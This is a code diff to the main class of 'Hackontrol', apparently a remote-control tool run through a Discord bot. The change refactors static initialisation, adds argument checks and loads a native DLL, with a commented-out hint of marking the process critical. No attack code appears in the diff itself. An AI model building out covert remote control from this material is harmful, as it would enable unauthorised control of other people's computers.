@@ -4,6 +4,9 @@ import java.io.File;
 import java.util.Collections;
 import java.util.List;
 
+import javax.swing.JOptionPane;
+import javax.swing.UIManager;
+
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -19,7 +22,6 @@ import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
 import com.khopan.hackontrol.registry.implementation.RegistryImplementation;
 import com.khopan.hackontrol.utils.ErrorHandler;
-import com.khopan.logger.hackontrol.HackontrolLoggerConfig;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
@@ -30,23 +32,14 @@ import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
 import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Hackontrol {
-	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY;
-	public static final RegistryType<Void, Class<? extends Module>> MODULE_REGISTRY;
+	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY = RegistryType.create();
+	public static final RegistryType<Void, Class<? extends Module>> MODULE_REGISTRY = RegistryType.create();
 
-	public static final Logger LOGGER;
-	public static final long STARTUP_TIME;
-	public static final String PERSISTENT_NICKNAME;
+	public static final Logger LOGGER = LoggerFactory.getLogger("Hackontrol");
+	public static final long STARTUP_TIME = System.currentTimeMillis();
+	public static final String PERSISTENT_NICKNAME = "nickname";
 
 	private static Hackontrol INSTANCE;
-
-	static {
-		STARTUP_TIME = System.currentTimeMillis();
-		NativeLibrary.load();
-		PERSISTENT_NICKNAME = "nickname";
-		MANAGER_REGISTRY = RegistryType.create();
-		MODULE_REGISTRY = RegistryType.create();
-		LOGGER = LoggerFactory.getLogger("Hackontrol");
-	}
 
 	private final PersistentStorage persistentStorage;
 	private final List<Manager> managerList;
@@ -263,10 +256,35 @@ public class Hackontrol {
 	}
 
 	public static void main(String[] args) throws Throwable {
+		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
+
+		if(args.length < 1) {
+			JOptionPane.showMessageDialog(null, "Invalid program argument", "Error", JOptionPane.ERROR_MESSAGE);
+			System.exit(1);
+			return;
+		}
+
+		File pathFolderHackontrol = new File(args[0]);
+
+		if(!pathFolderHackontrol.exists()) {
+			JOptionPane.showMessageDialog(null, "Directory '" + pathFolderHackontrol.getAbsolutePath() + "' does not exist", "Error", JOptionPane.ERROR_MESSAGE);
+			System.exit(1);
+			return;
+		}
+
+		File pathFileLibnative32 = new File(pathFolderHackontrol, "Native Library.dll"/*"libnative32.dll"*/);
+
+		if(!pathFileLibnative32.exists()) {
+			JOptionPane.showMessageDialog(null, "File '" + pathFileLibnative32.getAbsolutePath() + "' does not exist", "Error", JOptionPane.ERROR_MESSAGE);
+			System.exit(1);
+			return;
+		}
+
+		System.load(pathFileLibnative32.getAbsolutePath());
 		//NativeLibrary.critical(true);
-		HackontrolLoggerConfig.disableDebug();
+		/*HackontrolLoggerConfig.disableDebug();
 		Hackontrol.LOGGER.info("Initializing");
-		Hackontrol.getInstance();
+		Hackontrol.getInstance();*/
 	}
 
 	public static Hackontrol getInstance() {
